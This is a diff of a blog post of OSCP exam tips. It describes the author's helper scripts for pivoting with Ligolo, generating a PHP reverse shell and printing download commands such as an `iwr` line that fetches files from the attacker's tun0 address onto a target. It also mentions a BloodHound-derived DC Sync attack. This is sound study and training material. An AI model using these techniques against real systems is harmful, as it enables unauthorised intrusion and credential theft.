@@ -123,7 +123,7 @@ I know you can't do it on the exam, but you can learn a lot from asking ChatGPT 
 Btw, as of November 2024, [Claude](https://claude.ai/) is better for code, but the free tier is more limited by message, so sadly you might want to skip the "Perfect, that works, thank you" messages. I tend to be polite to chat bots, but hey I'm from the South. 
 
 ### Automate By Writing Your Own Scripts
-Automate by forcing your robot friends to write your own scripts!  Yeah, you'll learn more trying to write every line yourself, but you'll learn nothing if you give up because it's too confusing. I have a few custom scripts on my [GitHub](https://github.com/pentestpop/PopScripts), so you can get more details from the README there, but basically if I know some task is going to require multiple commands, or long commands I might mistype, I (or [someone](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*GmDjVtGv2I7A8-X5vC4tAQ.jpeg))create a script which runs the commands and echos anything I might need to paste into another window. Examples:
+Automate by forcing your robot friends to write your own scripts!  Yeah, you'll learn more trying to write every line yourself, but you'll learn nothing if you give up because it's too confusing. I have a few custom scripts on my [GitHub](https://github.com/pentestpop/PopScripts), so you can get more details from the README there, but basically if I know some task is going to require multiple commands, or long commands I might mistype, I (or [someone](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*GmDjVtGv2I7A8-X5vC4tAQ.jpeg)) create a script which runs the commands and echos anything I might need to paste into another window. Examples:
 - `liggy` starts Ligolo, asks for what subnet to pivot into, and then prints commands to run into the shell on the target.
 - `ivan` prompts the user for a IP and Port before generating a new copy of Ivan Sincek's [PHP-Reverse-Shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) in the working directory.
 - `served` prints certutil, iwr, and wget commands to be run on a remote target to download files from your machine using the `tun0` IP. So `served -f file.txt` returns `iwr -uri http://tun0/file.txt -o file.txt` and so on. 
@@ -190,7 +190,6 @@ It explains the relationship, and if we click Windows Abuse:
 ![](/assets/images/OSCP_Tricks/bloodhound4.png){: .center-aligned width="800px"}
 
 We get the exact command we would need to perform a DC Sync attack. In this example it doesn't really make a difference because we would already have Administrator access, but it can seriously help. It just happened to be quick to find this example in my files. What you can do, is check the `Node Info` tab on the the users you do have access, and the click on the different `Outbound Object Control` buttons to see what rights that user has over other nodes. In this case the Administrator user has rights over 94 nodes because it is in the "Domain Admins" group, hence `Group Delegated Object Control`.
-
 
 ![](/assets/images/OSCP_Tricks/bloodhound5.png){: .center-aligned width="800px"}
 
@@ -433,4 +432,3 @@ There's a ton out there for Cybersecurity in general. The Cyber Mentor, John Ham
 
 ## Closing Thoughts
 It's just fun. Do it or don't, I just hope this information helps someone cause I sure had a ton of help from strangers on the internet. 
-
